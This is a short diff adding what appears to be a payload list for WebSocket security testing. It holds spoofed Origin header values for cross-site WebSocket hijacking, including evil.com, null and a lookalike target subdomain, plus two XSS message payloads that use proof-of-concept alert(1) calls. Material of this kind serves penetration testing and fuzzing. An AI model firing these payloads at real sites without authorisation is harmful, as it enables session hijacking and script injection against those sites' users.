@@ -1,0 +1,8 @@
+# === Origin headers (Cross-Site WebSocket Hijacking) ===
+Origin: https://evil.com
+Origin: null
+Origin: https://target.com.evil.com
+
+# === Message payloads (XSS via WS message rendered to DOM) ===
+<img src=x onerror=alert(1)>
+{"cmd":"exec","data":"alert(1)"}
